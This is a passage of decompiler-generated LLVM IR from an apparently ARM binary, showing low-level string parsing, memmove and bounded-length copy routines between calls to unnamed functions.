  store i32 %v3_a8b0, i32* %r0.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r8, align 4
  %v1_a8b4 = add i32 %v0_a8b4, 12
  %v2_a8b4 = inttoptr i32 %v1_a8b4 to i32*
  %v3_a8b4 = load i32, i32* %v2_a8b4, align 4
  store i32 %v1_a0e0, i32* %r3.global-to-local, align 4
  %v1_a8bc = and i32 %v3_a8b4, 33554432
  %v2_a8bc = icmp ne i32 %v1_a8bc, 0
  store i1 %v2_a8bc, i1* %cpsr_c.global-to-local, align 1
  %v3_a8bc = mul i32 %v3_a8b4, 128
  %v2_a8c0 = add i32 %v3_a8bc, %v1_a0e0
  store i32 %v2_a8c0, i32* %r4.global-to-local, align 4
  store i32 %v2_a8c0, i32* %r0.global-to-local, align 4
  %v1_a8c8 = inttoptr i32 %v2_a8c0 to i8*
  %v2_a8c8 = call i32 @function_12d34(i8* %v1_a8c8)
  store i32 ptrtoint (i32* @global_var_139cc.105 to i32), i32* %r1.global-to-local, align 4
  %v2_a8d0 = add i32 %v2_a8c0, %v2_a8c8
  store i32 %v2_a8d0, i32* @r0, align 4
  %v2_a8d4 = inttoptr i32 %v2_a8d0 to i8*
  %v3_a8d4 = call i32 @function_12d5c(i8* %v2_a8d4, i32 ptrtoint (i32* @global_var_139cc.105 to i32))
  store i32 %v3_a8d4, i32* %r0.global-to-local, align 4
  %v0_a8d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_a8d8 = add i32 %v0_a8d8, 3
  store i32 %v1_a8d8, i32* @r4, align 4
  %v0_a8dc = load i32, i32* @r8, align 4
  %v1_a8dc = add i32 %v0_a8dc, 656
  %v2_a8dc = inttoptr i32 %v1_a8dc to i32*
  %v3_a8dc = load i32, i32* %v2_a8dc, align 4
  %v0_a8e0 = load i32, i32* @r7, align 4
  %v2_a8e0 = add i32 %v0_a8e0, %v1_a8d8
  store i32 %v2_a8e0, i32* %r6.global-to-local, align 4
  %v2_a8e4 = sub i32 %v3_a8dc, %v1_a8d8
  store i32 %v2_a8e4, i32* %r1.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  store i32 %v0_a8e8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136d0.103 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a8e0, i32* %r0.global-to-local, align 4
  %v4_a8f4 = call i32 @function_12df8(i32 %v2_a8e0, i32 %v2_a8e4, i32 ptrtoint (i32* @global_var_136d0.103 to i32), i32 %v0_a8e8)
  store i32 %v4_a8f4, i32* %r0.global-to-local, align 4
  %v0_a8f8 = load i32, i32* @r8, align 4
  %v1_a8f8 = add i32 %v0_a8f8, 12
  %v2_a8f8 = inttoptr i32 %v1_a8f8 to i32*
  %v3_a8f8 = load i32, i32* %v2_a8f8, align 4
  store i32 %v1_a0e0, i32* %ip.global-to-local, align 4
  %v1_a900 = and i32 %v3_a8f8, 33554432
  %v2_a900 = icmp ne i32 %v1_a900, 0
  store i1 %v2_a900, i1* %cpsr_c.global-to-local, align 1
  %v3_a900 = mul i32 %v3_a8f8, 128
  %v0_a904 = load i32, i32* @r4, align 4
  %v1_a904 = load i32, i32* %sb.global-to-local, align 4
  %v2_a908 = add i32 %v3_a900, %v1_a0e0
  store i32 %v2_a908, i32* @r5, align 4
  %v2_a904 = add i32 %v0_a904, %v4_a8f4
  %v2_a90c = add i32 %v2_a904, %v1_a904
  store i32 %v2_a90c, i32* @r4, align 4
  %v0_a910 = load i32, i32* %fp.global-to-local, align 4
  %v1_a910 = trunc i32 %v0_a910 to i8
  %v3_a910 = add i32 %v2_a90c, 2115
  %v4_a910 = inttoptr i32 %v3_a910 to i8*
  store i8 %v1_a910, i8* %v4_a910, align 1
  %v0_a914 = load i32, i32* @r5, align 4
  store i32 %v0_a914, i32* %r0.global-to-local, align 4
  %v1_a918 = inttoptr i32 %v0_a914 to i8*
  %v2_a918 = call i32 @function_12d34(i8* %v1_a918)
  %v0_a91c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_a91c, i32* %r1.global-to-local, align 4
  %v0_a920 = load i32, i32* @r5, align 4
  %v2_a920 = add i32 %v0_a920, %v2_a918
  store i32 %v2_a920, i32* @r0, align 4
  %v2_a924 = inttoptr i32 %v2_a920 to i8*
  %v3_a924 = call i32 @function_12d5c(i8* %v2_a924, i32 %v0_a91c)
  store i32 %v3_a924, i32* %r0.global-to-local, align 4
  %v0_a928 = load i32, i32* @r8, align 4
  %v1_a928 = add i32 %v0_a928, 12
  %v2_a928 = inttoptr i32 %v1_a928 to i32*
  %v3_a928 = load i32, i32* %v2_a928, align 4
  %v1_a92c = add i32 %v3_a928, 1
  store i32 %v1_a92c, i32* %r3.global-to-local, align 4
  store i32 %v1_a92c, i32* %v2_a928, align 4
  br label %dec_label_pc_a804

dec_label_pc_a938:                                ; preds = %dec_label_pc_a51c
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a944 = load i32, i32* @r5, align 4
  %v1_a944 = add i32 %v0_a944, 4
  %v2_a944 = inttoptr i32 %v1_a944 to i8*
  %v3_a944 = load i8, i8* %v2_a944, align 1
  %v4_a944 = zext i8 %v3_a944 to i32
  store i32 %v4_a944, i32* %r3.global-to-local, align 4
  %v2_a948 = icmp ugt i8 %v3_a944, 114
  store i1 %v2_a948, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a948 = icmp ult i8 %v3_a944, 115
  store i1 %v6_a948, i1* %cpsr_n.global-to-local, align 1
  %v7_a948 = icmp eq i8 %v3_a944, 115
  store i1 %v7_a948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a948, label %bb248, label %.thread70

bb248:                                            ; preds = %dec_label_pc_a938
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread70

.thread70:                                        ; preds = %dec_label_pc_a938, %bb248
  %v3_a958 = phi i32 [ 7, %dec_label_pc_a938 ], [ 8, %bb248 ]
  %v0_a95c = load i32, i32* @r7, align 4
  %v1_a95c = sub nsw i32 1, %v3_a958
  %v2_a960 = add i32 %v1_a95c, %v0_a95c
  store i32 %v2_a960, i32* %r2.global-to-local, align 4
  store i32 %v0_a944, i32* %r0.global-to-local, align 4
  %v2_a968 = add i32 %v3_a958, %v0_a944
  store i32 %v2_a968, i32* %r1.global-to-local, align 4
  %v3_a96c = inttoptr i32 %v0_a944 to i32*
  %v4_a96c = inttoptr i32 %v2_a968 to i32*
  %v5_a96c = call i32* @memmove(i32* %v3_a96c, i32* %v4_a96c, i32 %v2_a960)
  %v7_a96c = ptrtoint i32* %v5_a96c to i32
  store i32 %v7_a96c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_a97c = load i32, i32* @r6, align 4
  %v1_a97c = load i32, i32* @r4, align 4
  %v2_a97c = add i32 %v1_a97c, %v0_a97c
  %v3_a97c = inttoptr i32 %v2_a97c to i8*
  %v4_a97c = load i8, i8* %v3_a97c, align 1
  %v6_a97c = zext i8 %v4_a97c to i32
  store i32 %v6_a97c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_a980 = icmp eq i8 %v4_a97c, 0
  store i1 %v9_a980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a980, label %dec_label_pc_a9c0, label %dec_label_pc_a988

dec_label_pc_a988:                                ; preds = %.thread70
  %v2_a988 = icmp ugt i8 %v4_a97c, 46
  store i1 %v2_a988, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a988 = icmp ult i8 %v4_a97c, 47
  store i1 %v6_a988, i1* %cpsr_n.global-to-local, align 1
  %v7_a988 = icmp eq i8 %v4_a97c, 47
  store i1 %v7_a988, i1* %cpsr_z.global-to-local, align 1
  %v1_a98c = load i32, i32* @r5, align 4
  br i1 %v7_a988, label %bb249, label %dec_label_pc_a994

bb249:                                            ; preds = %dec_label_pc_a988
  store i32 %v1_a98c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_aaa4

dec_label_pc_a994:                                ; preds = %dec_label_pc_a988
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a9a4

dec_label_pc_a99c:                                ; preds = %dec_label_pc_a9a4
  %v2_a99c = icmp ugt i8 %v4_a9ac, 46
  store i1 %v2_a99c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a99c = icmp ult i8 %v4_a9ac, 47
  store i1 %v6_a99c, i1* %cpsr_n.global-to-local, align 1
  %v7_a99c = icmp eq i8 %v4_a9ac, 47
  store i1 %v7_a99c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a99c, label %dec_label_pc_aaa4, label %dec_label_pc_a9a4

dec_label_pc_a9a4:                                ; preds = %dec_label_pc_a99c, %dec_label_pc_a994
  %v1_a9b4 = phi i32 [ %v1_a9b8, %dec_label_pc_a99c ], [ 1, %dec_label_pc_a994 ]
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  store i32 %v1_a9b4, i32* %stack_var_-40, align 4
  %v2_a9ac = add i32 %v1_a9b4, %v1_a98c
  %v3_a9ac = inttoptr i32 %v2_a9ac to i8*
  %v4_a9ac = load i8, i8* %v3_a9ac, align 1
  %v6_a9ac = zext i8 %v4_a9ac to i32
  store i32 %v6_a9ac, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a9b0 = icmp eq i8 %v4_a9ac, 0
  store i1 %v2_a9b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a9ac, i32* %r1.global-to-local, align 4
  %v1_a9b8 = add i32 %v1_a9b4, 1
  store i32 %v1_a9b8, i32* %r3.global-to-local, align 4
  br i1 %v2_a9b0, label %dec_label_pc_a9c0, label %dec_label_pc_a99c

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9a4, %.thread70, %dec_label_pc_aaa4
  %v0_a9c0 = load i32, i32* @r5, align 4
  store i32 %v0_a9c0, i32* %r0.global-to-local, align 4
  %v1_a9c4 = inttoptr i32 %v0_a9c0 to i8*
  %v2_a9c4 = call i32 @function_12d34(i8* %v1_a9c4)
  store i32 %v2_a9c4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a9c8 = icmp slt i32 %v2_a9c4, 0
  store i1 %v1_a9c8, i1* %cpsr_n.global-to-local, align 1
  %v2_a9c8 = icmp eq i32 %v2_a9c4, 0
  store i1 %v2_a9c8, i1* %cpsr_z.global-to-local, align 1
  %tmp250 = icmp slt i32 %v2_a9c4, 1
  br i1 %tmp250, label %dec_label_pc_a9ec, label %dec_label_pc_a9d0

dec_label_pc_a9d0:                                ; preds = %dec_label_pc_a9c0
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r0.global-to-local, align 4
  %v1_a9d4 = inttoptr i32 %v0_a9d0 to i8*
  %v2_a9d4 = call i32 @function_12d34(i8* %v1_a9d4)
  store i32 %v2_a9d4, i32* %r0.global-to-local, align 4
  %v1_a9d8 = add i32 %v2_a9d4, -127
  %v2_a9d8 = icmp ugt i32 %v2_a9d4, 126
  store i1 %v2_a9d8, i1* %cpsr_c.global-to-local, align 1
  %v3_a9d8 = sub i32 126, %v2_a9d4
  %v4_a9d8 = and i32 %v3_a9d8, %v2_a9d4
  %v5_a9d8 = icmp slt i32 %v4_a9d8, 0
  store i1 %v5_a9d8, i1* %cpsr_v.global-to-local, align 1
  %v6_a9d8 = icmp slt i32 %v1_a9d8, 0
  store i1 %v6_a9d8, i1* %cpsr_n.global-to-local, align 1
  %v7_a9d8 = icmp eq i32 %v2_a9d4, 127
  store i1 %v7_a9d8, i1* %cpsr_z.global-to-local, align 1
  %v7_a9dc = icmp sgt i32 %v2_a9d4, 127
  br i1 %v7_a9dc, label %.thread73, label %bb251

bb251:                                            ; preds = %dec_label_pc_a9d0
  %v8_a9dc = load i32, i32* %sb.global-to-local, align 4
  %v9_a9e0 = add i32 %v8_a9dc, 789
  store i32 %v9_a9e0, i32* %r0.global-to-local, align 4
  %v8_a9e4 = load i32, i32* @r5, align 4
  store i32 %v8_a9e4, i32* %r1.global-to-local, align 4
  br label %.thread73

.thread73:                                        ; preds = %dec_label_pc_a9d0, %bb251
  store i32 43500, i32* %lr.global-to-local, align 4
  %v3_a9e8 = xor i1 %v6_a9d8, %v5_a9d8
  %v4_a9e8 = or i1 %v7_a9d8, %v3_a9e8
  call void @__pseudo_cond_branch(i1 %v4_a9e8, i32 ptrtoint (i32* @global_var_12d5c.101 to i32))
  br label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9c0, %.thread73
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v3_a9f0 = load i32, i32* %stack_var_-40, align 4
  %v0_a9f4 = load i32, i32* @r5, align 4
  %v2_a9f4 = add i32 %v3_a9f0, 1
  %v1_a9f8 = add i32 %v2_a9f4, %v0_a9f4
  store i32 %v1_a9f8, i32* %r0.global-to-local, align 4
  %v1_a9fc = inttoptr i32 %v1_a9f8 to i8*
  %v2_a9fc = call i32 @function_12d34(i8* %v1_a9fc)
  store i32 %v2_a9fc, i32* %r0.global-to-local, align 4
  %v1_aa00 = add i32 %v2_a9fc, -255
  %v2_aa00 = icmp ugt i32 %v2_a9fc, 254
  store i1 %v2_aa00, i1* %cpsr_c.global-to-local, align 1
  %v3_aa00 = sub i32 254, %v2_a9fc
  %v4_aa00 = and i32 %v3_aa00, %v2_a9fc
  %v5_aa00 = icmp slt i32 %v4_aa00, 0
  store i1 %v5_aa00, i1* %cpsr_v.global-to-local, align 1
  %v6_aa00 = icmp slt i32 %v1_aa00, 0
  store i1 %v6_aa00, i1* %cpsr_n.global-to-local, align 1
  %v7_aa00 = icmp eq i32 %v2_a9fc, 255
  store i1 %v7_aa00, i1* %cpsr_z.global-to-local, align 1
  %v8_aa04 = icmp sgt i32 %v2_a9fc, 255
  br i1 %v8_aa04, label %dec_label_pc_a554, label %dec_label_pc_aa08

dec_label_pc_aa08:                                ; preds = %dec_label_pc_a9ec
  %v0_aa08 = load i32, i32* %sb.global-to-local, align 4
  %v1_aa0c = add i32 %v0_aa08, 533
  store i32 %v1_aa0c, i32* @r4, align 4
  store i32 %v1_aa0c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_aa18 = call i32 @function_12dd4(i32 %v1_aa0c, i32 255)
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  %v3_aa20 = load i32, i32* %stack_var_-40, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  %v2_aa24 = add i32 %v3_aa20, 1
  %v1_aa28 = add i32 %v2_aa24, %v0_aa24
  store i32 %v1_aa28, i32* %r0.global-to-local, align 4
  %v1_aa2c = inttoptr i32 %v1_aa28 to i8*
  %v2_aa2c = call i32 @function_12d34(i8* %v1_aa2c)
  store i32 %v2_aa2c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aa30 = icmp slt i32 %v2_aa2c, 0
  store i1 %v1_aa30, i1* %cpsr_n.global-to-local, align 1
  %v2_aa30 = icmp eq i32 %v2_aa2c, 0
  store i1 %v2_aa30, i1* %cpsr_z.global-to-local, align 1
  %tmp252 = icmp slt i32 %v2_aa2c, 1
  br i1 %tmp252, label %dec_label_pc_a554, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa08
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  %v3_aa3c = load i32, i32* %stack_var_-40, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  %v0_aa44 = load i32, i32* @r4, align 4
  store i32 %v0_aa44, i32* @r0, align 4
  %v2_aa40 = add i32 %v3_aa3c, 1
  %v1_aa48 = add i32 %v2_aa40, %v0_aa40
  store i32 %v1_aa48, i32* %r1.global-to-local, align 4
  %v2_aa4c = inttoptr i32 %v0_aa44 to i8*
  %v3_aa4c = call i32 @function_12d5c(i8* %v2_aa4c, i32 %v1_aa48)
  store i32 %v3_aa4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a554

dec_label_pc_aa54:                                ; preds = %dec_label_pc_a2bc
  %v0_aa54 = load i32, i32* @r4, align 4
  %v1_aa54 = trunc i32 %v0_aa54 to i8
  %v2_aa54 = load i32, i32* @r8, align 4
  %v3_aa54 = add i32 %v2_aa54, -1452
  %v4_aa54 = inttoptr i32 %v3_aa54 to i8*
  store i8 %v1_aa54, i8* %v4_aa54, align 1
  br label %dec_label_pc_9508

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_a4d4
  %v1_aa5c = add i32 %v0_aa5c, 1
  store i32 %v1_aa5c, i32* %ip.global-to-local, align 4
  %v2_aa60 = add i32 %v0_a4d4, %v1_aa5c
  store i32 %v2_aa60, i32* %r4.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  store i32 %v2_aa60, i32* %r0.global-to-local, align 4
  store i32 %v1_aa5c, i32* %stack_var_-40, align 4
  %v1_aa70 = inttoptr i32 %v2_aa60 to i8*
  %v2_aa70 = call i32 @function_12d34(i8* %v1_aa70)
  store i32 %v2_aa70, i32* %r0.global-to-local, align 4
  %v0_aa74 = load i32, i32* %r4.global-to-local, align 4
  %v2_aa74 = add i32 %v0_aa74, %v2_aa70
  %v1_aa78 = add i32 %v2_aa74, -1
  %v2_aa78 = inttoptr i32 %v1_aa78 to i8*
  %v3_aa78 = load i8, i8* %v2_aa78, align 1
  %v4_aa78 = zext i8 %v3_aa78 to i32
  store i32 %v4_aa78, i32* %r3.global-to-local, align 4
  %v2_aa7c = icmp ugt i8 %v3_aa78, 33
  store i1 %v2_aa7c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa7c = icmp ult i8 %v3_aa78, 34
  store i1 %v6_aa7c, i1* %cpsr_n.global-to-local, align 1
  %v7_aa7c = icmp eq i8 %v3_aa78, 34
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa7c, label %dec_label_pc_aa84, label %dec_label_pc_a4e0

dec_label_pc_aa84:                                ; preds = %dec_label_pc_aa5c
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  %v3_aa88 = load i32, i32* %stack_var_-40, align 4
  %v0_aa8c = load i32, i32* @r6, align 4
  %v2_aa8c = add i32 %v0_aa8c, %v3_aa88
  store i32 %v2_aa8c, i32* %r4.global-to-local, align 4
  store i32 %v2_aa8c, i32* %r0.global-to-local, align 4
  %v1_aa94 = inttoptr i32 %v2_aa8c to i8*
  %v2_aa94 = call i32 @function_12d34(i8* %v1_aa94)
  store i32 %v2_aa94, i32* %r0.global-to-local, align 4
  %v2_aa98 = add i32 %v2_aa8c, %v2_aa94
  %v0_aa9c = load i32, i32* @r5, align 4
  %v1_aa9c = trunc i32 %v0_aa9c to i8
  %v3_aa9c = add i32 %v2_aa98, -1
  %v4_aa9c = inttoptr i32 %v3_aa9c to i8*
  store i8 %v1_aa9c, i8* %v4_aa9c, align 1
  br label %dec_label_pc_a4e0

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_a99c, %bb249
  %v2_aaa8 = phi i32 [ %v1_a98c, %bb249 ], [ %v2_a9ac, %dec_label_pc_a99c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_aaa8 = inttoptr i32 %v2_aaa8 to i8*
  store i8 0, i8* %v3_aaa8, align 1
  br label %dec_label_pc_a9c0

dec_label_pc_aab0:                                ; preds = %dec_label_pc_a548
  store i32 %v10_8fc0, i32* %ip.global-to-local, align 4
  %v3_aab4 = load i32, i32* %stack_var_-40, align 4
  %v0_aab8 = load i32, i32* @r5, align 4
  %v2_aab8 = add i32 %v3_aab4, 1
  %v1_aabc = add i32 %v2_aab8, %v0_aab8
  store i32 %v1_aabc, i32* %r0.global-to-local, align 4
  %v1_aac0 = inttoptr i32 %v1_aabc to i8*
  %v2_aac0 = call i32 @function_12d34(i8* %v1_aac0)
  store i32 %v2_aac0, i32* %r0.global-to-local, align 4
  %v1_aac4 = add i32 %v2_aac0, -255
  %v2_aac4 = icmp ugt i32 %v2_aac0, 254
  store i1 %v2_aac4, i1* %cpsr_c.global-to-local, align 1
  %v3_aac4 = sub i32 254, %v2_aac0
  %v4_aac4 = and i32 %v3_aac4, %v2_aac0
  %v5_aac4 = icmp slt i32 %v4_aac4, 0
  store i1 %v5_aac4, i1* %cpsr_v.global-to-local, align 1
  %v6_aac4 = icmp slt i32 %v1_aac4, 0
  store i1 %v6_aac4, i1* %cpsr_n.global-to-local, align 1
  %v7_aac4 = icmp eq i32 %v2_aac0, 255
  store i1 %v7_aac4, i1* %cpsr_z.global-to-local, align 1
  %v8_aac8 = icmp sgt i32 %v2_aac0, 255
  br i1 %v8_aac8, label %dec_label_pc_a554, label %dec_label_pc_aacc

dec_label_pc_aacc:                                ; preds = %dec_label_pc_aab0
  %v0_aacc = load i32, i32* %sb.global-to-local, align 4
  %v1_aad0 = add i32 %v0_aacc, 533
  store i32 %v1_aad0, i32* @r4, align 4
  store i32 %v1_aad0, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_aadc = call i32 @function_12dd4(i32 %v1_aad0, i32 255)
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  %v3_aae4 = load i32, i32* %stack_var_-40, align 4
  %v0_aae8 = load i32, i32* @r5, align 4
  %v2_aae8 = add i32 %v3_aae4, 1
  %v1_aaec = add i32 %v2_aae8, %v0_aae8
  store i32 %v1_aaec, i32* %r0.global-to-local, align 4
  %v1_aaf0 = inttoptr i32 %v1_aaec to i8*
  %v2_aaf0 = call i32 @function_12d34(i8* %v1_aaf0)
  store i32 %v2_aaf0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aaf4 = icmp slt i32 %v2_aaf0, 0
  store i1 %v1_aaf4, i1* %cpsr_n.global-to-local, align 1
  %v2_aaf4 = icmp eq i32 %v2_aaf0, 0
  store i1 %v2_aaf4, i1* %cpsr_z.global-to-local, align 1
  %tmp253 = icmp slt i32 %v2_aaf0, 1
  br i1 %tmp253, label %dec_label_pc_a554, label %dec_label_pc_aafc

dec_label_pc_aafc:                                ; preds = %dec_label_pc_aacc
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  %v3_ab00 = load i32, i32* %stack_var_-40, align 4
  %v0_ab04 = load i32, i32* @r5, align 4
  %v0_ab08 = load i32, i32* @r4, align 4
  store i32 %v0_ab08, i32* @r0, align 4
  %v2_ab04 = add i32 %v3_ab00, 1
  %v1_ab0c = add i32 %v2_ab04, %v0_ab04
  store i32 %v1_ab0c, i32* %r1.global-to-local, align 4
  %v2_ab10 = inttoptr i32 %v0_ab08 to i8*
  %v3_ab10 = call i32 @function_12d5c(i8* %v2_ab10, i32 %v1_ab0c)
  store i32 %v3_ab10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a554

dec_label_pc_ab40:                                ; preds = %dec_label_pc_9114, %dec_label_pc_914c
  %v0_9198 = call i32 @function_105b0()
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_91a0 = urem i32 %v0_9198, 5
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_91a4 = icmp ult i32 %v2_91a0, 4
  store i1 %v6_91a4, i1* %cpsr_n.global-to-local, align 1
  %v7_91a4 = icmp eq i32 %v2_91a0, 4
  store i1 %v7_91a4, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_aba8 = call i32 @function_12280(i32 54)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 54, i32* %r0.global-to-local, align 4
  %v3_abb4 = call i32 @function_1219c(i32 54, i32* null)
  store i32 %v3_abb4, i32* %r1.global-to-local, align 4
  %v0_abbc = load i32, i32* @r5, align 4
  %v1_abbc = add i32 %v0_abbc, 20
  store i32 %v1_abbc, i32* @r0, align 4
  %v2_abc0 = inttoptr i32 %v1_abbc to i8*
  %v3_abc0 = call i32 @function_12d5c(i8* %v2_abc0, i32 %v3_abb4)
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_abc8 = call i32 @function_121c8(i32 54)
  %v0_ab40 = load i32, i32* @sl, align 4
  store i32 %v0_ab40, i32* %r1.global-to-local, align 4
  store i32 %v0_90dc, i32* @r0, align 4
  %v2_ab48 = inttoptr i32 %v0_90dc to i8*
  %v3_ab48 = call i32 @function_12d5c(i8* %v2_ab48, i32 %v0_ab40)
  store i32 %v3_ab48, i32* %r0.global-to-local, align 4
  store i32 %v0_906c, i32* %r1.global-to-local, align 4
  %v0_ab50 = load i32, i32* @r7, align 4
  %v1_ab50 = add i32 %v0_ab50, 1
  store i32 %v1_ab50, i32* @r7, align 4
  %v0_ab54 = load i32, i32* @r5, align 4
  %v2_ab58 = sub i32 %v0_906c, %v1_ab50
  %v3_ab58 = icmp uge i32 %v0_906c, %v1_ab50
  store i1 %v3_ab58, i1* %cpsr_c.global-to-local, align 1
  %v4_ab58 = xor i32 %v1_ab50, %v0_906c
  %v5_ab58 = xor i32 %v2_ab58, %v0_906c
  %v6_ab58 = and i32 %v5_ab58, %v4_ab58
  %v7_ab58 = icmp slt i32 %v6_ab58, 0
  store i1 %v7_ab58, i1* %cpsr_v.global-to-local, align 1
  %v8_ab58 = icmp slt i32 %v2_ab58, 0
  store i1 %v8_ab58, i1* %cpsr_n.global-to-local, align 1
  %v9_ab58 = icmp eq i32 %v0_906c, %v1_ab50
  store i1 %v9_ab58, i1* %cpsr_z.global-to-local, align 1
  %v1_ab5c = add i32 %v0_ab54, 3140
  store i32 %v1_ab5c, i32* @r5, align 4
  br i1 %v9_ab58, label %dec_label_pc_ab64, label %dec_label_pc_909c

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab40
  %v1_ab70 = add i32 %v3_9080, 1456
  %v0_ab78 = load i32, i32* %r8.global-to-local, align 4
  %v1_ab78 = urem i32 %v0_ab78, 256
  store i32 %v1_ab78, i32* %ip.global-to-local, align 4
  %v1_ab7c = add i32 %v3_9080, 1464
  store i32 %v1_ab7c, i32* %r2.global-to-local, align 4
  %v2_ab80 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_ab80, i32* %r3.global-to-local, align 4
  store i32 %v1_ab70, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_91f8.preheader

; uselistorder directives
  uselistorder i32 %v2_ab80, { 1, 0 }
  uselistorder i32 %v1_ab7c, { 1, 0 }
  uselistorder i32 %v1_ab70, { 1, 0 }
  uselistorder i32 %v1_ab5c, { 1, 0 }
  uselistorder i32 %v2_ab58, { 1, 0 }
  uselistorder i32 %v1_ab50, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_91a0, { 1, 0 }
  uselistorder i32 %v2_aac0, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_aa5c, { 1, 0, 2 }
  uselistorder i32 %v2_a9fc, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a9d4, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_a9b8, { 1, 0 }
  uselistorder i8 %v4_a9ac, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_a9b4, { 1, 0, 2 }
  uselistorder i1 %v7_a99c, { 1, 0 }
  uselistorder i32 %v1_a98c, { 1, 0, 2 }
  uselistorder i1 %v7_a988, { 1, 0 }
  uselistorder i1 %v9_a980, { 1, 0 }
  uselistorder i32 %v2_a960, { 1, 0 }
  uselistorder i32 %v0_a944, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a8e0, { 1, 0, 2 }
  uselistorder i32 %v1_a8d8, { 1, 0, 2 }
  uselistorder i32 %v2_a890, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a864, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v3_a7e8, { 5, 1, 0, 4, 3, 2, 6 }
  uselistorder i32 %v2_a7cc, { 1, 0, 2 }
  uselistorder i32 %v4_a7c4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_a78c, { 1, 0 }
  uselistorder i32 %v1_a78c, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_a78c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_a6f4, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a6cc, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_a6ac, { 1, 0 }
  uselistorder i8 %v4_a6a4, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v0_a6ac, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a690, { 1, 0 }
  uselistorder i32 %v1_a680, { 1, 0, 2 }
  uselistorder i1 %v7_a67c, { 1, 0 }
  uselistorder i32 %v0_a63c, { 2, 0, 1, 3 }
